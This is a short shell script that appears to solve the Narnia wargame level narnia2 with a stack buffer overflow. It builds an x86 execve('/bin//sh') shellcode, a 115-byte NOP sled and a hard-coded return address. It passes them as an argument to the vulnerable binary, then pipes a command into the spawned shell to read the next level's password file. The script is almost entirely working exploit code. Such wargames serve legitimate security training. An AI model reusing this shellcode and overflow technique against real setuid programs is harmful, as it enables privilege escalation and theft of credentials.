#!/bin/sh

# Shellcode that will open us a shell
EGGSHELL="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# NOP sled
NOP_SLED=$(printf "\x90%.0s" {1..115})

# Pointer to where we think the NOP sled will be in memory
NOP_SLED_POINTER="\xc0\xd8\xff\xff"

# Complete exploit to put in memory
EXPLOIT_ARGUMENT=$(printf "$NOP_SLED$EGGSHELL$NOP_SLED_POINTER")

# Command we want to run once given shell
printf "cat /etc/narnia_pass/narnia3" | \

# Pass to the exploitable program
/narnia/narnia2 $EXPLOIT_ARGUMENT

